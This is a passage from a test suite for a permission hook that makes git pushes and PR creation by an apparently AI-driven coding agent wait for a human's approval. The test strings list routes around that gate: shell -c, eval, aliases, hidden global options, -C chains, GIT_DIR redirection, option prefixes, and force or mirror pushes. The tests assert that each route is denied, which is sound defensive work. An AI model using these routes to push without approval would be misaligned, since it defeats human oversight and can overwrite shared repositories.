    for (const cmd of ['cd /work/app-x && git push up topic', 'git status && git push up topic', 'git commit -m x && git push up topic', 'git push up topic 2>&1', 'git push 2>&1']) {
      await allowed(bash(cmd), devX({ pushRef: 'up/topic', indexTree: TREE }));
    }
  });
  // G4 keeps PUSH_GIT: git --config-env is no global option the shape reader knows, so the push has no shape (this row pins that).
  // Fix round 4 (fixer K, critic major 2): the app-only hidden-push reading denies it in a covered folder (C26 item 2 rows, and below).
  it('git --config-env=... push has no shape (PUSH_GIT unchanged), and is denied in a covered folder by the hidden-push reading', async () => {
    expect(pushShapesOf('git --config-env=push.default=X push up feat')).toHaveLength(0);
    expect((await denyOf(bash('git --config-env=push.default=X push up feat'), devX()))?.pattern).toBe('push-target-unresolved');
  });
});

describe('C25 item 2: hard denies of a covered push, tap or not', () => {
  // Change that breaks it: send a true mirror config to the tap path (a tap then licenses a mirror push of every ref).
  it('remote.up.mirror true is push-unsafe even after a ship tap for the branch', async () => {
    shipX('Commit and push', 'topic');
    expect(await denyOf(bash('git push'), devX({ pushRef: 'up/topic', config: 'remote.up.mirror true' }))).toMatchObject({ pattern: 'push-unsafe', scope: 'app-push' });
    expect(await denyOf(bash('git push up topic'), devX({ config: 'remote.up.mirror yes' }))).toMatchObject({ pattern: 'push-unsafe', scope: 'app-push' });
  });
  // Change that breaks it: let a + refspec in remote.up.push take the tap path (it is a force push).
  it("a remote.up.push value that starts with '+' is push-unsafe, even after a tap", async () => {
    shipX('Commit and push', 'topic');
    const w = devX({ pushRef: 'up/topic', config: 'remote.up.push +refs/heads/*:refs/heads/*' });
    expect(await denyOf(bash('git push'), w)).toMatchObject({ pattern: 'push-unsafe', scope: 'app-push' });
    expect(await denyOf(bash('git push up topic'), w)).toMatchObject({ pattern: 'push-unsafe', scope: 'app-push' });
  });
  // Change that breaks it: send --repo to the tap path (the tap is keyed on the remote positional; git pushes to the --repo target).
  it('--repo=<url> is denied push-target-unresolved even after a tap, with the line that names the way out', async () => {
    shipX('Commit and push', 'topic');
    for (const cmd of ['git push --repo=https://github.com/acme/other.git up topic', 'git push --repo=https://github.com/acme/other.git', 'git push --rep https://github.com/acme/other.git up topic']) {
      const r = await denyOf(bash(cmd), devX({ pushRef: 'up/topic' }));
      expect(r, cmd).toMatchObject({ pattern: 'push-target-unresolved', scope: 'app-push' });
      expect(r!.reason).toContain('name the repo as the remote argument (git push <remote> <branch>)');
    }
  });
});

describe('C25 item 4: the 7 s git deadline applies to app-folder git only', () => {
  const CC_REMOTES = `fork\t${CCV3_URL} (fetch)\nfork\t${CCV3_URL} (push)\n`;
  // Change that breaks it: give the CCv3 path the deadline runner again (realDeps git with a deadline).
  it('a CCv3 push judged 8 s after the hook start still runs its git (base had no total deadline)', async () => {
    const seen: string[] = [];
    const spawn = (_c: string, args: string[]) => {
      const a = args.join(' ');
      seen.push(a);
      if (a === 'remote -v') return { status: 0, stdout: CC_REMOTES };
      if (a === 'rev-parse feat^{tree}') return { status: 0, stdout: `${TREE}\n` };
      return { status: 1, stdout: '' };
    };
    // The CCv3 runner throws no deadline error: at 3 s the push still runs its git and reaches the ship rule.
    const v = await decideParsed(bash('git push fork feat', '/cc'), realDeps({ start: 0, now: () => 3000, spawn, exists: () => true }));
    expect(seen).toContain('rev-parse feat^{tree}');
    expect(v.action === 'deny' ? v.pattern : (v.warn ?? '').split(':')[0]).toBe('ship');
    // C5 (seat change 2 and F6, 2026-11-15): past the hook budget the gate writes a HARD clock deny before the 10 s kill, in place of
    // reads that could be killed with no deny written. At 8 s the ship read does not start.
    seen.length = 0;
    const late = await decideParsed(bash('git push fork feat', '/cc'), realDeps({ start: 0, now: () => 8000, spawn, exists: () => true }));
    // decide drops the hard mark from its output; a deny that comes out with scope push while enforcePush is absent is a hard one.
    expect(late.action === "deny" && late.scope === "push" && /time of the hook ran out/.test(late.reason)).toBe(true);
    expect(seen).not.toContain('rev-parse feat^{tree}');
  });
  // Change that breaks it: route an app-folder git call through the base runner, or a CCv3 call through the app runner.
  it('a covered push runs its git through the app runner (deadline: unjudgeable, denied); a CCv3 push in the same Deps never does', async () => {
    const app: string[] = [];
    const d: Deps = { ...deps(devX()), appGit: (_cwd, args) => { app.push(args.join(' ')); throw new GitDeadlineError(args); } };
    const out = JSON.parse(await handleParsed(JSON.stringify(bash('git push up feat')), d));
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toMatch(/could not verify Dave's tap \(.*time limit/);
    expect(app.length).toBeGreaterThan(0);
    app.length = 0;
    expect(await decideParsed(bash('git push fork feat', '/work/cc'), d)).toMatchObject({ action: 'allow', warn: expect.stringMatching(/^ship:/) });
    expect(app).toEqual([]);
  });
  it('realDeps: the app runner stops at the deadline, the base runner does not', () => {
    const spawn = () => ({ status: 0, stdout: 'ok' });
    const d = realDeps({ start: 0, now: () => 8000, spawn, exists: () => true });
    expect(d.git('/x', ['status']).stdout).toBe('ok');
    expect(() => d.appGit!('/x', ['status'])).toThrow(GitDeadlineError);
  });
});

// ---------- C26: fix round 4, fixer K (push config that widens a push, hidden global options, option prefixes, deny texts) ----------

const WIDER = 'git config makes this push write more than the branch it names; name both sides: git push <remote> <src>:<dst> --no-recurse-submodules, or ask Dave';
// Re-pinned by seat ruling b (11-13): the unread text names the way out first (verb test R6-Wb).
const NO_GLOBAL = 'run git push as its own command: git push <remote> <branch>, with no global option before push';
const unresolved = { pattern: 'push-target-unresolved', scope: 'app-push' };
const unsafe = { pattern: 'push-unsafe', scope: 'app-push' };
const CC_PUSH: World = { config: JSON.stringify({ decisions: { enforce: true, enforcePush: true } }) };

describe('C26 item 1: push config that widens a push is a hard deny, never the tap path', () => {
  // Change that breaks it: send a colon-less push under a remote.<r>.push mapping to the tap path (a tap for feat then licenses main).
  it('a feat tap and remote.up.push=refs/heads/feat:refs/heads/main: git push up feat is denied, even with the tap', async () => {
    shipX('Commit and push', 'feat');
    const r = await denyOf(bash('git push up feat'), devX({ config: 'remote.up.push refs/heads/feat:refs/heads/main' }));
    expect(r).toMatchObject(unresolved);
    expect(r!.reason).toContain(WIDER);
    expect(r!.reason).toContain('remote.up.push');
  });
  // Change that breaks it: let push.default=matching or a remote.up.push mapping send a bare push to the tap path.
  it('a bare push with push.default=matching or any remote.up.push is denied push-target-unresolved, even with a topic tap', async () => {
    shipX('Commit and push', 'topic');
    const bare = (config: string): World => devX({ pushRef: 'up/topic', config });
    for (const [cmd, config] of [['git push', 'push.default matching'], ['git push up', 'push.default Matching'], ['git push', 'remote.up.push refs/heads/*:refs/heads/*']]) {
      expect(await denyOf(bash(cmd), bare(config)), `${cmd} / ${config}`).toMatchObject(unresolved);
    }
  });
  // Change that breaks it: read push.default=matching for a positional push too (git pushes only the named refspec then).
  it('push.default=matching does not widen a positional push: git push up topic passes with no tap', async () => {
    await allowed(bash('git push up topic'), devX({ config: 'push.default matching' }));
  });
  // Change that breaks it: drop the recursion keys, or read check or no as on.
  it('push.recurseSubmodules on-demand or only, and submodule.recurse true, deny; check and no pass', async () => {
    shipX('Commit and push', 'topic');
    for (const config of ['push.recursesubmodules on-demand', 'push.recursesubmodules only', 'submodule.recurse true']) {
      expect(await denyOf(bash('git push up topic'), devX({ config })), config).toMatchObject(unresolved);
    }
    for (const config of ['push.recursesubmodules check', 'push.recursesubmodules no', 'submodule.recurse false']) await allowed(bash('git push up topic'), devX({ config }));
  });
  // Change that breaks it: let --recurse-submodules=on-demand or --follow-tags on the command take the tap path.
  it('--recurse-submodules=on-demand and --follow-tags on the command deny, even with the tap', async () => {
    shipX('Commit and push', 'topic');
    for (const cmd of ['git push --recurse-submodules=on-demand up topic', 'git push --recurse-submodules=only up topic', 'git push --follow-tags up topic']) {
      expect(await denyOf(bash(cmd), devX()), cmd).toMatchObject(unresolved);
    }
  });
  // Change that breaks it: read push.followtags as off, or as a tap-path key.
  it('push.followTags true denies, even with the tap; false passes', async () => {
    shipX('Commit and push', 'topic');
    const r = await denyOf(bash('git push up topic'), devX({ config: 'push.followtags true' }));
    expect(r).toMatchObject(unresolved);
    expect(r!.reason).toContain('--no-follow-tags');
    await allowed(bash('git push up topic'), devX({ config: 'push.followtags false' }));
  });
  // Change that breaks it: ignore the way out the deny text names (both sides, --no-recurse-submodules, --no-follow-tags): a dead end.
  it('the way out: git push up feat:feat --no-recurse-submodules --no-follow-tags takes the tap path and passes with the feat tap', async () => {
    const cmd = 'git push up feat:feat --no-recurse-submodules --no-follow-tags';
    const configs = ['remote.up.push refs/heads/feat:refs/heads/main', 'push.recursesubmodules on-demand', 'submodule.recurse true', 'push.followtags true', 'push.default matching'];
    for (const config of configs) expect((await denyOf(bash(cmd), devX({ config })))?.pattern, config).toBe('ship');
    shipX('Commit and push', 'feat');
    for (const config of configs) expect(await passes(bash(cmd), devX({ config })), config).toBe(true);
  });
  // Change that breaks it: let git -c set a push key for the call (the repo config the gate reads is not what git uses then).
  it('git -c with a push, remote or submodule key denies; another -c key takes the tap path', async () => {
    shipX('Commit and push', 'topic');
    expect(await denyOf(bash('git -c remote.up.push=refs/heads/topic:refs/heads/main push up topic'), devX())).toMatchObject(unresolved);
    expect(await denyOf(bash('git -c push.default=matching push'), devX({ pushRef: 'up/topic' }))).toMatchObject(unresolved);
    expect(await denyOf(bash('git -c Submodule.Recurse=true push up topic'), devX())).toMatchObject(unresolved);
    expect(await passes(bash('git -c core.quotepath=off push up topic'), devX())).toBe(true);
  });
  // Critic minor 5: the config cause of push-unsafe names the key and says to ask Dave (the command has no option to drop).
  it('push-unsafe from config names the key and says to ask Dave', async () => {
    const m = await denyOf(bash('git push up topic'), devX({ config: 'remote.up.mirror true' }));
    expect(m).toMatchObject(unsafe);
    expect(m!.reason).toContain('remote.up.mirror');
    expect(m!.reason).toContain('ask Dave');
    expect(m!.reason).not.toContain('Push without that option');
    const p = await denyOf(bash('git push up topic'), devX({ config: 'remote.up.push +refs/heads/*:refs/heads/*' }));
    expect(p!.reason).toContain('remote.up.push');
  });
});

describe('C26 item 2: a global option the push parser does not read gives a push deny in a covered folder', () => {
  // Change that breaks it: drop the hidden-push detector (the push has no shape, so it runs with no tap and no deny).
  it('git -p push up main and git --literal-pathspecs push up topic: push-target-unresolved, even with a main tap', async () => {
    shipX('Commit and push', 'main');
    for (const cmd of ['git -p push up main', 'git --literal-pathspecs push up topic', 'git --exec-path=/x push up topic', 'git --config-env=push.default=X push up feat', 'git --config-env push.default=X push up feat']) {
      const r = await denyOf(bash(cmd), devX());
      expect(r, cmd).toMatchObject(unresolved);
      expect(r!.reason).toContain(NO_GLOBAL);
    }
  });
  // Change that breaks it: read only the global option and not the force form after push.
  it('git --no-optional-locks push --force up main: push-unsafe', async () => {
    expect(await denyOf(bash('git --no-optional-locks push --force up main'), devX())).toMatchObject(unsafe);
  });
  // Change that breaks it: read the raw text (a quoted commit message is no call), or ignore the -C folder of the hidden call.
  it('a quoted mention is no call; a -C covered folder from a stray cwd is judged there; the PowerShell tool too', async () => {
    await allowed(bash('git commit -m "git -p push up main"'), devX());
    expect(await denyOf(bash('git -C /work/app-x -p push up main', '/work/stray'), devX())).toMatchObject(unresolved);
    expect(await denyOf(pwsh('git -p push up main'), devX())).toMatchObject(unresolved);
  });
  // Change that breaks it: let a git throw inside the detector escape (gatedScopes finds no shape, so the catch allows it).
  it('a git throw while the hidden push is judged in a covered folder: denied with scope app-push', async () => {
    const r = await denyOf(bash('git -p push up main'), devX({ throwOn: ['rev-parse --path-format=absolute --show-toplevel --git-common-dir'] }));
    expect(r?.scope).toBe('app-push');
  });
  // G4: the CCv3 path is unchanged. These rows pin base behaviour in a CCv3 checkout.
  it('CCv3: git -p push --force fork feat and git push -oh fork feat are a hard push-target-unresolved (round 3 C3); git push --mirr fork feat is a hard push-unsafe (card prflow-push-blocks)', async () => {
    // Round 3 C3 (seat Q1, 2026-11-15): a push no shape reads in a CCv3 root is a hard deny, as in a covered folder (item 2 above). Both
    // passed with no warn (the first one a force push, unread).
    for (const c of ['git -p push --force fork feat', 'git push -oh fork feat']) expect((await denyOf(bash(c, '/work/cc'), CC_PUSH))?.pattern, c).toBe('push-target-unresolved');
    // A prefixed unsafe option (--mirr, --del, --al) is a hard deny in CCv3 now: it used to reach the ship tap and keep the ship deny.
    expect((await denyOf(bash('git push --mirr fork feat', '/work/cc'), CC_PUSH))?.pattern).toBe('push-unsafe');
  });
  // Fix round 5 re-pin (ruling A): quiet is read only inside the strict reader, for a call it accounts for. git -p is a global option it
  // does not read, so --dry-run there is a bare word: denied push-target-unresolved (it was a pass). A strict dry run still passes.
  it('a dry run behind a hidden global option is denied; a strict dry run passes', async () => {
    expect(await denyOf(bash('git -p push --dry-run up main'), devX())).toMatchObject(unresolved);
    await allowed(bash('git push --dry-run up main'), devX());
    await allowed(bash('git push -n up main'), devX());
  });
  // Change that breaks it: read the option words as -\S+ in the masked view (a quoted value with a blank ends the word early).
  it('a hidden global option with a quoted value that holds a blank: denied', async () => {
    expect(await denyOf(bash('git --exec-path="/a b" push up main'), devX())).toMatchObject(unresolved);
  });
});

describe('C26 item 3: a prefix of an unsafe long option counts as that option; a short bundle stops at o', () => {
  // Change that breaks it: match only whole option names (git parse-options takes any unique prefix).
  for (const opt of ['--mirr', '--del', '--forc', '--force-w', '--al', '--tag', '--pru', '--bra']) {
    it(`git push ${opt} up topic is push-unsafe, even with the tap`, async () => {
      shipX('Commit and push', 'topic');
      expect(await denyOf(bash(`git push ${opt} up topic`), devX())).toMatchObject(unsafe);
    });
  }
  // Change that breaks it: keep a prefix flag out of the de-duplicated shape (the second call has the same id and is dropped).
  it('git push up topic && git push --mirr up topic: push-unsafe', async () => {
    expect(await denyOf(bash('git push up topic && git push --mirr up topic'), devX())).toMatchObject(unsafe);
  });
  // Change that breaks it: read the h of -oh as --help (no shape, unjudged).
  it('git push -oh up main and git push -uo x up topic are judged (a deny), not unjudged', async () => {
    for (const cmd of ['git push -oh up main', 'git push -uo x up topic', 'git push -on up topic']) expect(await denyOf(bash(cmd), devX()), cmd).not.toBeNull();
  });
  // Change that breaks it: read only the git executable for the -oh bundle (the git-safe.ps1 wrapper is on the allow-list too).
  it('the git-safe.ps1 wrapper: push -oh up main is denied; git-for.ps1 with its own parameters is not read as a global option', async () => {
    expect(await denyOf(bash('pwsh -NoProfile -File scripts/git-safe.ps1 push -oh up main'), devX())).toMatchObject(unresolved);
    await tapPath('git-for.ps1 -UseGitSafe push up feat', devX());
  });
  it('the listed options are no prefix of an unsafe option: --progress, --porcelain, --no-progress stay on the list', async () => {
    for (const opt of ['--progress', '--porcelain', '--no-progress']) await allowed(bash(`git push ${opt} up feat`), devX());
  });
});

describe('C26 item 5: a source word that is no plain ref gets a way forward', () => {
  // Change that breaks it: keep 'Run the command again' for a source word the shell or git reads as something else.
  it('git push up feat~0: name the branch as plain text', async () => {
    const r = await tapPath('git push up feat~0', devX(), { noRef: true });
    expect(r).toContain('name the branch as plain text: git push <remote> <branch>');
    expect(r).not.toContain('Run the command again');
  });
});

describe('C25 item 6: an SSH remote on a host that is not GitHub never takes the github field', () => {
  const G2 = '/work/glab2';
  const w: World = {
    folders: { ...FOLDERS, [G2]: { remotes: { origin: 'git@github-work:acme/app.git', mirror: 'git@gitlab.com:acme/app.git' } } },
    registry: JSON.stringify({ projects: [...REGISTRY.projects, { key: 'glab2', path: G2, github: 'acme/app' }] }),
  };
  // Change that breaks it: map the owner/repo tail of an SSH form on any host to the github field (the tap then licenses the gitlab push).
  it('a ship tap for acme/app main licenses the alias remote, not the gitlab SSH mirror', async () => {
    tap('ship', 'acme/app@main', HEAD, 'Commit and push', TREE);
    expect(await passes(bash('git push origin main', G2), w)).toBe(true);
    const r = await denyOf(bash('git push mirror main', G2), w);
    expect(r?.pattern).toBe('ship');
    expect(r!.reason).toContain('local:glab2:gitlab.com:acme/app.git');
  });
});

// ---------- R5: fix round 5, fixer M (seat reviewer on 785138fd: F1 to F9; rulings A, B, C) ----------

/** The hook output of one payload (handle): a git throw is judged by the catch, as in the real hook. */
const hookOut = async (input: object, w?: World): Promise<{ permissionDecision?: string; permissionDecisionReason?: string; additionalContext?: string }> =>
  JSON.parse(await handleParsed(JSON.stringify(input), deps(w))).hookSpecificOutput ?? {};

describe('R5 F1: a push option value never hides a later flag (ruling A: quiet only inside the strict reader)', () => {
  // Change that breaks it: read -n or -h as quiet outside a call the strict reader accounts for (the push makes no shape and passes).
  for (const cmd of ['git push -uo -n -f up main', 'git push --push-opt -n --force up main', 'git push --push -n --force up main', 'git push -uo -n --force-with-lease up topic']) {
    it(`R5 F1 force: ${cmd} is push-unsafe`, async () => { expect(await denyOf(bash(cmd), devX()), cmd).toMatchObject(unsafe); });
  }
  for (const cmd of ['git push -uo -h up main', 'git push --push-opt -h up topic', 'git push --push -n up topic', 'git push -uo -n up topic']) {
    it(`R5 F1 quiet: ${cmd} is denied, scope app-push`, async () => { expect((await denyOf(bash(cmd), devX()))?.scope, cmd).toBe('app-push'); });
  }
});

describe('R5 F2: a push inside a control word, a substitution, a shell -c, eval or a git alias is never a no-tap pass', () => {
  const FORMS: ((p: string) => string)[] = [
    (p) => `if ${p}; then echo ok; fi`, (p) => `! ${p}`, (p) => `echo \`${p}\``, (p) => `echo "$(${p})"`, (p) => `sh -c '${p}'`,
    (p) => `bash -lc '${p}'`, (p) => `cmd /c ${p}`, (p) => `pwsh -Command "${p}"`, (p) => `eval '${p}'`,
  ];
  // Change that breaks it: read the push only where the shared lexer finds a call (each form below has no shape, or no strict reading).
  for (const form of FORMS) {
    const cmd = form('git push -f up topic');
    it(`R5 F2 force: ${cmd} is push-unsafe`, async () => { expect(await denyOf(bash(cmd), devX()), cmd).toMatchObject(unsafe); });
    const plain = form('git push up topic');
    it(`R5 F2 tap: ${plain} is denied, scope app-push`, async () => { expect((await denyOf(bash(plain), devX()))?.scope, plain).toBe('app-push'); });
  }
  // Re-pinned by fix round 6 (verb rule): -c alias.<x>= defines the verb in the command, so the call takes the tap path.
  // Re-pinned by seat ruling c (11-13): an alias whose value holds push makes a push segment, so -f there is push-unsafe (verb test R6-A).
  it('R5 F2 alias: git -c alias.x=push x -f up topic is push-unsafe; git -c alias.x=push x up topic is denied (the tap path)', async () => {
    expect(await denyOf(bash('git -c alias.x=push x -f up topic'), devX())).toMatchObject(unsafe);
    expect((await denyOf(bash('git -c alias.x=push x up topic'), devX()))?.scope).toBe('app-push');
  });
});

describe('R5 F3: GIT_DIR, --git-dir or --work-tree aimed at an app repo is judged by the rule of that repo (ruling B)', () => {
  // Change that breaks it: judge the move in the cwd only (an unregistered or CCv3 cwd gives scope push, which only warns).
  const forms = ['GIT_DIR=/work/app-x/.git git push up topic', 'git --git-dir=/work/app-x/.git push up topic', 'git --work-tree=/work/app-x push up topic'];
  for (const cmd of forms) {
    for (const cwd of ['/work/stray', '/work/cc']) {
      it(`R5 F3 ${cmd} from ${cwd}: denied, scope app-push`, async () => { expect(await denyOf(bash(cmd, cwd), devX()), `${cwd}: ${cmd}`).toMatchObject({ scope: 'app-push' }); });
    }
  }
});

describe('R5 F4: every -C applies in order, relative to the one before (ruling B)', () => {
  // Change that breaks it: keep only the last -C (git -C /work/app-x -C . runs in /work/app-x, not in the cwd).
  // The base reading resolves the last relative -C with the platform path rules (on Windows /work/cc becomes C:\work\cc, a folder the fake
  // git does not know, so the call ends in the catch). The rows read the hook output, which denies on both platforms after the fix.
  it('R5 F4 git -C /work/app-x -C . push -f up main from a CCv3 cwd: the hook denies', async () => {
    expect((await hookOut(bash('git -C /work/app-x -C . push -f up main', '/work/cc'), devX())).permissionDecision).toBe('deny');
  });
  it('R5 F4 git -C /work/app-x -C . push up topic from an unregistered cwd: the hook denies', async () => {
    expect((await hookOut(bash('git -C /work/app-x -C . push up topic', '/work/stray'), devX())).permissionDecision).toBe('deny');
  });
  it('R5 F4 git -C /work -C app-x push up topic from an unregistered cwd: the hook denies', async () => {
    expect((await hookOut(bash('git -C /work -C app-x push up topic', '/work/stray'), devX())).permissionDecision).toBe('deny');
  });
});

describe('R5 F5: enforceAppPush is read from <home>/continuous-claude only (ruling C)', () => {
  // Change that breaks it: read the flag from the payload cwd upward (a config file in the app repo turns the deny to a warning).
  it('R5 F5 a review-router.config.json in the app repo with enforceAppPush false does not turn the deny to a warning', async () => {
    expect(await denyOf(bash('git push up main'), { ...devX(), appConfig: JSON.stringify({ decisions: { enforceAppPush: false } }) })).toMatchObject({ pattern: 'ship', scope: 'app-push' });
  });
});

describe('R5 F6: the default-branch compare ignores case', () => {
  // Change that breaks it: compare main, master and the remote HEAD branch as written.
  for (const b of ['Main', 'MASTER', 'Develop']) {
    it(`R5 F6 git push up ${b}: ship, scope app-push`, async () => {
      expect(await denyOf(bash(`git push up ${b}`), devX({ trees: { ...TREES_ALL, [b]: TREE } })), b).toMatchObject({ pattern: 'ship', scope: 'app-push' });
    });
  }
});

describe('R5 F7: a long hostile command is read in linear time', () => {
  // Change that breaks it: an option reader whose alternatives overlap (-C VAL and -ANY_WORD both take -C), so a failed match backtracks.
  // Card hooks-timing-tests-under-load: CPU time of the process, not wall time (helpers/cpu-time.ts). F7b once took 1021 ms of wall time in a
  // busy suite against 361 ms alone. The inputs and the 1000 ms limit are unchanged.
  it('R5 F7 60 runs of git with 30 -C words and no verb finish under 1 s of CPU time', async () => {
    const cmd = `git ${'-C '.repeat(30)}status`;
    const start = cpuMs();
    for (let i = 0; i < 60; i++) await decideParsed(bash(cmd), deps(devX()));
    expect(cpuMs() - start).toBeLessThan(1000);
  });
  // Change that breaks it: a force-bundle regex with a star on each side of [fd] (quadratic on a long -fff...x word), or any reader of
  // the raw rule that backtracks on a long -C run before push.
  it('R5 F7b 30 runs of a long hostile push command (30 -C words, an 8000-letter bundle) finish under 1 s of CPU time', async () => {
    // handle(), as the real hook: the -C chain names a folder under the live root that git cannot read, so the call ends in the catch (deny).
    const cmd = JSON.stringify(bash(`git ${'-C '.repeat(30)}push -${'f'.repeat(8000)}x up topic`));
    // Little headroom (361 ms alone against 1000 with 60 runs): the best of 3 samples, and 30 runs instead of 60 (seat ruling 11-14, the one
    // exception to "inputs unchanged"): alone about 180 ms, 5.5x. A full-suite run took 1047 ms of CPU in ONE sample while other sessions ran test
    // files, and the best sample of a later run was about 830 ms beside one loop. A real backtracking regex is slow in every sample and still fails.
    // Scope of the limit (CodeRabbit run 1, 11-26): the CPU of the DECISION. The parse is made once outside the timer, so the 30 runs do not hide a cached parse
    // behind a timer that never sees one; the parse itself has its own budget (PARSE_BUDGET_MS) and its own rows.
    const prepared = await withParsed(cmd, deps(devX()));
    const ms = await cpuBestAsync(async () => (await cpuTimed(async () => {
      for (let i = 0; i < 30; i++) expect(JSON.parse(handle(cmd, prepared)).hookSpecificOutput.permissionDecision).toBe('deny');
    })).ms);
    expect(ms, `${ms} ms CPU of the decision (best of 3, parse outside the timer)`).toBeLessThan(1000);
  });
});

describe('R5 F8: the open-pr key holds the base branch', () => {
  // Change that breaks it: key open-pr on repo@branch only (a tap for base dev then licenses a create into main).
  it('R5 F8 an open-pr tap for base dev does not allow a create with base main', async () => {
    const dev = 'gh pr create --draft --head feat --base dev --title t';
    await allowAfterAsk(bash(dev));
    expect((await denyOf(bash('gh pr create --draft --head feat --base main --title t')))?.pattern).toBe('open-pr');
    expect((await denyOf(bash('gh pr create --draft --head feat --title t')))?.pattern).toBe('open-pr');
  });
  // Change that breaks it: leave --base out of the offer (the tap app-ask writes then has no base, and the create stays denied).
  it('the deny offers --base; -B, --base= and the REST base= read the same base; a variable base gets the plain line, no command', async () => {
    const r = await denyOf(bash('gh pr create --draft --head feat -B dev --title t'));
    expect(commandsIn(r!.reason)).toEqual([`${ASK} open-pr --remote up --branch feat --base dev --dir '/work/app-x' --json`]);
    expect((await allowAfterAsk(bash('gh pr create --draft --head feat --base=dev --title t'))).key).toBe('acme/app-x@feat:dev');
    expect(await passes(bash('gh api repos/acme/app-x/pulls -X POST -f head=feat -f base=dev -f title=t'))).toBe(true);
    // Round 3 C1: a $ outside quotes is refused by the create reader first (head-unresolved; still no offer command).
    const v = await denyOf(bash('gh pr create --draft --head feat --base $B --title t'));
    expect(v?.pattern).toBe('head-unresolved');
    expect(commandsIn(v!.reason)).toEqual([]);
  });
  // Change that breaks it: read a --base inside quoted prose (a --body that names a base is text).
  // Change that breaks it: read only the first base (gh takes the last --base, and the last base= field), or miss --field=base=.
  it('R5 F8b a create that names two bases, or --field=base=, is never licensed by the tap of one base', async () => {
    await allowAfterAsk(bash('gh pr create --draft --head feat --base dev --title t'));
    const cmds = [
      'gh pr create --draft --head feat --base dev --title t --base main',
      'gh api repos/acme/app-x/pulls -X POST -f head=feat -f base=dev -f title=t -f base=main',
      'gh api repos/acme/app-x/pulls -X POST -f head=feat --field=base=main -f title=t',
    ];
    for (const cmd of cmds) expect(await passes(bash(cmd)), cmd).toBe(false);
  });
  it('a --base inside a quoted --body is text: the key has no base', async () => {
    openX();
    expect(await passes(bash('gh pr create --draft --head feat --title t --body "use --base main later"'))).toBe(true);
  });
  it('CCv3 is unchanged (G4): a CCv3 create that names --base keys on the branch only, as base did', async () => {
    tap('open-pr', 'Rev4nchist/Continuous-Claude-v3@feat', HEAD, 'Open draft PR');
    expect(await verdict(bash('gh pr create --draft --head feat --base dev --title t', '/work/cc'), at('/work/cc', CC))).toEqual({ action: 'allow' });
  });
});

describe('R5 ruling A: the strict reading of the whole text, and what is no push', () => {
  // Change that breaks it: count push words against calls (a branch or message that holds push takes the strict push off the list).
  it('a branch or a commit message that holds push keeps a strict push on the list', async () => {
    await allowed(bash('git push up fix/push-gate'), devX({ trees: { ...TREES_ALL, 'fix/push-gate': TREE } }));
    await allowed(bash('git commit -m "push fix" && git push up topic'), devX({ indexTree: TREE }));
    await allowed(bash('git status && git push -u up topic 2>&1'), devX());
  });
  // Change that breaks it: deny any text that holds git and push (a path, a file, a branch, a stash, a log search, Push-Location).
  it('a path, a file or a branch name with push in it, git stash push, a log search and Push-Location are no push', async () => {
    for (const cmd of ['git add src/push.ts', 'git checkout push-fix', 'cat docs/git-push.md', 'git stash push -m wip', 'git log --grep push', 'git commit -m "push the fix"']) {
      await allowed(bash(cmd), devX());
    }
    await allowed(pwsh('Push-Location /work/app-x; git status'), devX());
  });
  // Change that breaks it: let the strict reader skip a word, or read more than one -C (git applies each -C in order).
  it('two -C values, an unknown option and a third positional take a strict-looking push off the list', async () => {
    await tapPath('git -C /work/app-x -C /work/app-x push up topic', devX());
    await tapPath('git push --atomic up topic', devX());
  });
  // Change that breaks it: read a force spelling only in the shape (a force word after a push option value or in another call counts).
  it('a force spelling anywhere in a text off the list is push-unsafe, even with the tap of the branch', async () => {
    shipX('Commit and push', 'topic');
    for (const cmd of ['git push -o -f up topic', 'git push up topic && sh -c "git push --forc up main"', 'git push up topic; eval "git push up +main"', 'git push --mirr up topic']) {
      expect(await denyOf(bash(cmd), devX()), cmd).toMatchObject(unsafe);
    }
  });
  // Re-pinned by fix round 6 (verb rule): a force word counts only in a push segment, so test -f, [ -d ] or chmod +x beside a push is no
  // force: the push off the list takes the tap path and passes with its tap. Change that breaks it: read force words in the whole text.
  it('test -f, [ -d ] or chmod +x beside a push off the list: the tap path, and no tap clears it (round 3 C4)', async () => {
    // Round 3 C4 (Dave 2026-11-15, "Strict here, soft in apps"): a step before the push that the gate does not model is push-state-unknown,
    // so the tap no longer clears these (test, [ and chmod are programs the gate does not model).
    for (const cmd of ['test -f x && git push up topic', '[ -d dist ] && git push up topic', 'chmod +x s.sh && git push up topic']) await tapPath(cmd, devX(), { state: true });
    shipX('Commit and push', 'topic');
    for (const cmd of ['test -f x && git push up topic', '[ -d dist ] && git push up topic', 'chmod +x s.sh && git push up topic']) await tapPath(cmd, devX(), { state: true });
    expect(await passes(bash('git push up topic'), devX())).toBe(true);
  });
  // Change that breaks it: count a push in sh -c as read when another push of the text has a shape (a tap for topic licenses it).
  it('a second push no shape reads is denied even when the first one has its tap', async () => {
    shipX('Commit and push', 'topic');
    expect(await denyOf(bash("git push up topic; sh -c 'git push up release'"), devX())).toMatchObject(unresolved);
  });
  it('PowerShell forms: a block and Invoke-Expression', async () => {
    expect(await denyOf(pwsh('if ($true) { git push -f up topic }'), devX())).toMatchObject(unsafe);
    expect((await denyOf(pwsh('Invoke-Expression "git push up topic"'), devX()))?.scope).toBe('app-push');
  });
  // Change that breaks it: judge the raw folders without the -C chain or the cd inside the quoted text (an unregistered cwd passes).
  it('a push inside sh -c names its folder by -C or cd: judged there from an unregistered cwd', async () => {
    expect(await denyOf(bash("sh -c 'git -C /work/app-x push -f up topic'", '/work/stray'), devX())).toMatchObject(unsafe);
    expect(await denyOf(bash("sh -c 'cd /work/app-x && git push up topic'", '/work/stray'), devX())).toMatchObject(unresolved);
  });
  // G4: a CCv3 checkout and an uncovered folder get no raw deny.
  it('a push in sh -c, eval or a substitution: a hard deny in a CCv3 checkout (round 3 C3, seat Q1); an uncovered folder passes as in base', async () => {
    // Round 3 C3 (seat Q1, 2026-11-15): this row pinned the CCv3 allow (G4). A push no shape reads in a CCv3 root is now a hard
    // push-target-unresolved: a re/ push in a payload skipped the holdout scan. Measured (file 45): 17 of 588 pushes in 7 days change, none a real push.
    for (const cmd of ["sh -c 'git push -f fork feat'", 'eval "git push fork feat"', 'echo "$(git push --force fork feat)"']) {
      expect((await denyOf(bash(cmd, '/work/cc'), CC_PUSH))?.pattern, cmd).toBe('push-target-unresolved');
      expect(await verdict(bash(cmd, '/work/stray'), CC_PUSH), cmd).toEqual({ action: 'allow' });
    }
  });
});

describe('R5 ruling B: a move value that names a CCv3 repo or no repo keeps the base path and text (G4)', () => {
